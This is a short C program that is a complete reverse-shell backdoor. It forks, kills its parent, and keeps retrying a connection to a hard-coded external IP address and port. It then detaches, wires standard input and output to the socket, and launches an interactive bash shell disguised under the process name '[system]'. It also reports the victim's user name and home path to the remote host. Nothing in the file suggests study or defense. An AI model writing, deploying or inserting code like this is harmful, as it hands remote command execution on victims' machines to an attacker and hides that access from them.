#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>

#define REC_TIMEOUT 3
#define BUFFER 4096

void DieWithError(char *msg);

int main(int arg, char **argv[])
{
	int sock;
	unsigned short server_port = 55556;
	char server_ip[] = "130.211.102.76"; 
	char shell[] = "/bin/bash";
	char fakename[] = "[system]", welcome_msg[BUFFER]; 
	struct sockaddr_in server_addr;
	pid_t PID, parent_PID;

	parent_PID = getpid();

	if((PID = fork()) < 0)
		DieWithError("fork() failed!\n");
	else if(PID == 0){
		kill(parent_PID, SIGKILL);

		if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
			DieWithError("socket() filed!\n");

		memset(&server_addr, 0, sizeof(server_addr));
		server_addr.sin_family = AF_INET;
		server_addr.sin_addr.s_addr = inet_addr(server_ip);
		server_addr.sin_port = htons(server_port);

		while(1){
			if(connect(sock, (struct sockaddr*) &server_addr, sizeof(server_addr)) >= 0)
				break;

			sleep(REC_TIMEOUT);
		}

		setsid();
		chdir("/");
		umask(0);
		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);
		
		memset(welcome_msg, 0, sizeof(welcome_msg));
		sprintf(welcome_msg, "Welcome USER=%s PATH=%s", getenv("USER"), getenv("HOME"));

		fprintf(stderr, "\n %s \n", welcome_msg);

		execl(shell, fakename, "-i", 0);

		close(sock);
	}

	return 0;

}

void DieWithError(char *msg)
{
	perror(msg);
	exit(1);
}
